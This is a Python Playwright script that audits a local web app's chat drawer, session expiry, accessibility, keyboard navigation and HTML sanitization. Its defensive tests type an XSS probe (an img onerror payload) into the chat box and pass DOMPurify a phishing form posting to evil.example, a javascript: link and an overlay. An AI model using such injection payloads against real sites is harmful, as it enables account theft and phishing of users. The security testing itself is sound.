"""Interactive journeys against the local UI-audit instance."""

import asyncio
import json
import os
import sys

S = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, os.path.join(S, "app"))
os.environ["SECRET_KEY"] = "uiaudit-local-only"
from tests.e2e.session import forge_session_cookie  # noqa: E402
from playwright.async_api import async_playwright  # noqa: E402

BASE = "http://localhost:8790"
EXE = "/home/a/.cache/ms-playwright/chromium_headless_shell-1234/chrome-headless-shell-linux64/chrome-headless-shell"
ids = json.load(open(os.path.join(S, "seed_ids.json")))
A1, A2, A3 = ids["assessments"]
AXE = open(os.path.join(S, "axe.min.js")).read()
results = {}


async def ctx_for(browser, role, width=1280, bypass_csp=False):
    ctx = await browser.new_context(viewport={"width": width, "height": 900}, bypass_csp=bypass_csp)
    if role:
        await ctx.add_cookies([{"name": "copi-session", "value": forge_session_cookie(ids[role]),
                                "url": BASE}])
    page = await ctx.new_page()
    log = {"console": [], "pageerror": [], "dialogs": []}
    page.on("console", lambda m: log["console"].append(f"{m.type}: {m.text}"[:300])
            if m.type in ("error",) else None)
    page.on("pageerror", lambda e: log["pageerror"].append(str(e)[:300]))

    async def on_dialog(d):
        log["dialogs"].append(f"{d.type}: {d.message[:120]}")
        await d.dismiss()
    page.on("dialog", on_dialog)
    return ctx, page, log


async def chat_journey(browser, role, path, width, tag):
    ctx, page, log = await ctx_for(browser, role, width)
    r = {"log": log}
    await page.goto(BASE + path, wait_until="networkidle")
    opener = page.locator("[data-chat-open]").first
    r["open_button"] = await opener.count()
    if not r["open_button"]:
        results[tag] = r
        await ctx.close()
        return
    await opener.click()
    await page.wait_for_timeout(500)
    r["drawer_visible"] = await page.locator("#assessment-chat").is_visible()
    r["focus_after_open"] = await page.evaluate("document.activeElement && (document.activeElement.id || document.activeElement.tagName)")
    await page.fill("#assessment-chat-question", "What is proposed? <img src=x onerror=window.__xss=1>")
    await page.click("[data-chat-send]")
    await page.wait_for_timeout(6000)
    r["xss"] = await page.evaluate("window.__xss || 0")
    r["log_html"] = (await page.locator("[data-chat-log]").inner_html())[-1800:]
    r["links"] = await page.evaluate("[...document.querySelectorAll('[data-chat-log] a')].map(a => [a.getAttribute('href'), a.target, a.rel])")
    r["imgs"] = await page.evaluate("document.querySelectorAll('[data-chat-log] img').length")
    r["error_text"] = await page.locator("[data-chat-error]").inner_text()
    r["overflow"] = await page.evaluate("document.documentElement.scrollWidth - innerWidth")
    r["log_overflow"] = await page.evaluate("(() => {const l=document.querySelector('[data-chat-log]'); return l.scrollWidth - l.clientWidth})()")
    await page.screenshot(path=os.path.join(S, "shots", f"chat_{tag}.png"))
    await page.keyboard.press("Escape")
    await page.wait_for_timeout(300)
    r["visible_after_esc"] = await page.locator("#assessment-chat").is_visible()
    r["focus_after_esc"] = await page.evaluate("document.activeElement && (document.activeElement.getAttribute('data-chat-open') !== null ? 'opener' : document.activeElement.tagName)")
    # Re-open: history should reload
    await opener.click()
    await page.wait_for_timeout(1500)
    r["reopen_turns"] = await page.locator("[data-chat-log] > *").count()
    # Session expiry mid-use: drop cookie, ask again
    await ctx.clear_cookies()
    await page.fill("#assessment-chat-question", "second question after logout")
    await page.click("[data-chat-send]")
    await page.wait_for_timeout(3000)
    r["after_logout_error"] = await page.locator("[data-chat-error]").inner_text()
    r["after_logout_url"] = page.url
    results[tag] = r
    await ctx.close()


async def sim_refresh_journey(browser):
    ctx, page, log = await ctx_for(browser, "admin")
    await page.goto(BASE + "/admin/simulation", wait_until="networkidle")
    r = {"log": log}
    mr = page.locator("input[name='max_runtime']")
    r["has_form"] = await mr.count()
    if r["has_form"]:
        await mr.fill("60")
        await page.locator("input[name='max_proposals']").fill("20")
        await page.mouse.click(5, 300)  # blur onto blank space
        r["before"] = await page.evaluate("[document.querySelector(\"input[name='max_runtime']\").value, document.querySelector(\"input[name='max_proposals']\").value]")
        await page.wait_for_timeout(33000)
        r["after"] = await page.evaluate("[document.querySelector(\"input[name='max_runtime']\").value, document.querySelector(\"input[name='max_proposals']\").value]")
    results["sim_refresh"] = r
    await ctx.close()


async def graph_axe(browser):
    out = {}
    for path in ("/cabo-graph", "/scripps-graph"):
        ctx, page, log = await ctx_for(browser, None, 1280, bypass_csp=True)
        await page.goto(BASE + path, wait_until="networkidle")
        await page.add_script_tag(content=AXE)
        v = await page.evaluate("""async () => (await axe.run(document, {runOnly: {type: 'tag',
            values: ['wcag2a','wcag2aa','wcag21aa','wcag22aa','best-practice']}})).violations.map(v => [v.id, v.impact, v.nodes.length, v.nodes[0].target.join(' ')])""")
        out[path] = {"axe": v, "log": log,
                     "overflow375": None}
        await ctx.close()
        ctx, page, log = await ctx_for(browser, None, 375)
        await page.goto(BASE + path, wait_until="networkidle")
        await page.screenshot(path=os.path.join(S, "shots", f"graph375_{path.strip('/')}.png"))
        out[path]["log375"] = log
        await ctx.close()
    results["graph"] = out


async def keyboard_journey(browser):
    ctx, page, log = await ctx_for(browser, "admin")
    await page.goto(BASE + "/admin/activity", wait_until="networkidle")
    seq = []
    for _ in range(40):
        await page.keyboard.press("Tab")
        seq.append(await page.evaluate("(() => {const e=document.activeElement; return e.tagName + ' ' + (e.getAttribute('href') || e.textContent.trim().slice(0,30))})()"))
    results["kbd_activity"] = {"tab_seq": seq, "log": log}
    await ctx.close()


async def profile_edit_journey(browser):
    ctx, page, log = await ctx_for(browser, "pi")
    await page.goto(BASE + "/profile/edit", wait_until="networkidle")
    r = {"log": log}
    inputs = await page.evaluate("[...document.querySelectorAll('input,textarea,select')].map(e => [e.tagName, e.name, e.type, e.id]).slice(0,40)")
    r["inputs"] = inputs
    results["profile_edit"] = r
    await ctx.close()


async def detail_checks(browser):
    ctx, page, log = await ctx_for(browser, "admin")
    await page.goto(BASE + f"/admin/assessments/{A2}", wait_until="networkidle")
    r = {"log": log}
    # B-02: what DOMPurify's default (page profile) keeps
    r["purify_default"] = await page.evaluate("""() => DOMPurify.sanitize(marked.parse('<form action="https://evil.example/x"><input name=p placeholder=password><button>Sign in</button></form> <img src="https://evil.example/p.png"> <div id="m-1" style="position:fixed;inset:0;background:red">overlay</div> <a href="javascript:alert(1)">j</a> <a href="https://e.example" target=_blank>t</a>'))""")
    r["purify_version"] = await page.evaluate("DOMPurify.version")
    # B-01: timeline clamp after opening a collapsed <details id=timeline>
    r["timeline_open_initially"] = await page.evaluate("(() => {const t=document.getElementById('timeline'); return t ? t.open : null})()")
    await page.evaluate("(() => {const t=document.getElementById('timeline'); if (t) t.open = true})()")
    await page.wait_for_timeout(800)
    r["clamp_state"] = await page.evaluate("""() => [...document.querySelectorAll('#timeline .max-h-64')].map(b => ({sh: b.scrollHeight, ch: b.clientHeight,
        btn_hidden: (b.parentElement.querySelector('button[hidden], [data-clamp-toggle][hidden]') !== null),
        any_visible_btn: [...b.parentElement.querySelectorAll('button')].filter(x => !x.hidden && x.offsetParent !== null).map(x => x.textContent.trim()).slice(0,3)}))""")
    await page.screenshot(path=os.path.join(S, "shots", "detail_timeline_open.png"), full_page=True)
    results["detail"] = r
    await ctx.close()


async def chat_focus(browser):
    ctx, page, log = await ctx_for(browser, "admin")
    await page.goto(BASE + f"/admin/assessments/{A1}", wait_until="networkidle")
    await page.locator("[data-chat-open]").first.click()
    await page.wait_for_timeout(500)
    await page.focus("#assessment-chat-question")
    await page.keyboard.type("Focus test question")
    await page.keyboard.press("Enter")
    await page.wait_for_timeout(300)
    during = await page.evaluate("document.activeElement.tagName + '#' + document.activeElement.id")
    await page.wait_for_timeout(6000)
    after = await page.evaluate("document.activeElement.tagName + '#' + document.activeElement.id")
    results["chat_focus"] = {"during": during, "after": after, "log": log}
    await ctx.close()


async def sim_refresh_expiry(browser):
    ctx, page, log = await ctx_for(browser, "admin")
    await page.goto(BASE + "/admin/simulation", wait_until="networkidle")
    await ctx.clear_cookies()
    await page.wait_for_timeout(33000)
    results["sim_expiry"] = {"has_sim_body": await page.locator("#sim-body").count(),
                             "nav_count": await page.locator("nav").count(),
                             "login_form_injected": await page.locator("#sim-body a[href*='login'], #sim-body form[action*='login']").count(),
                             "log": log}
    await ctx.close()


async def main():
    os.makedirs(os.path.join(S, "shots"), exist_ok=True)
    async with async_playwright() as p:
        browser = await p.chromium.launch(executable_path=EXE)
        await asyncio.gather(
            chat_journey(browser, "admin", f"/admin/assessments/{A2}", 1280, "admin_desktop"),
            chat_journey(browser, "admin", f"/admin/assessments/{A1}", 375, "admin_mobile"),
            chat_journey(browser, "reviewer", f"/manager/assessments/{A2}", 1280, "reviewer"),
            chat_journey(browser, "manager", f"/manager/assessments/{A1}", 1280, "manager"),
            sim_refresh_journey(browser),
            graph_axe(browser),
            keyboard_journey(browser),
            profile_edit_journey(browser),
            detail_checks(browser),
            chat_focus(browser),
            sim_refresh_expiry(browser),
        )
        await browser.close()
    json.dump(results, open(os.path.join(S, "journeys.json"), "w"), indent=1)
    print("done")


asyncio.run(main())
